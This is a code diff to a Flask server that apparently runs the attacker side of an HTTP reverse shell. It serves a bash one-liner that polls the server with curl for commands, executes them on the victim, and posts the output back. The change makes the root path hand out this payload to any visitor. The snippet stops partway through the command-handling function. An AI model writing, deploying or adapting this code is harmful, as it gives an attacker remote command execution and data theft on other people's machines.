@@ -13,7 +13,7 @@ app = Flask(__name__)
 
 @app.route('/', methods=['GET'])
 def get_home():
-    return '', 200
+    return get_bash()
 
 
 @app.route('/windows/', methods=['GET'])
@@ -21,8 +21,8 @@ def get_windows():
     return 'while :;do c=$(curl -s {hostname}/http_reverse_shell/?ready=true);[ -n "$c" ]&&curl -X POST -s {hostname}/http_reverse_shell/ --data-urlencode "stdout=$($c)";sleep {delay};done'.format(hostname=HOSTNAME, delay=REFRESH_DELAY), 200
 
 
-@app.route('/linux/', methods=['GET'])
-def get_linux():
+@app.route('/bash/', methods=['GET'])
+def get_bash():
     return 'while :;do c=$(curl -s {hostname}/http_reverse_shell/?ready=true);[ -n "$c" ]&&curl -X POST -s {hostname}/http_reverse_shell/ --data-urlencode "stdout=$($c)";sleep {delay};done'.format(hostname=HOSTNAME, delay=REFRESH_DELAY), 200
 
 
@@ -32,9 +32,9 @@ def get_http_reverse_shell():
         if 'windows' in str(request.user_agent).lower():
             return get_windows()
         elif 'linux' in str(request.user_agent).lower():
-            return get_linux()
+            return get_bash()
         else:
-            return get_linux()
+            return get_bash()
     with open(os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), 'command.lock'), 'r+') as lock:
         command = lock.read().split('\n')[0]
         lock.seek(0)
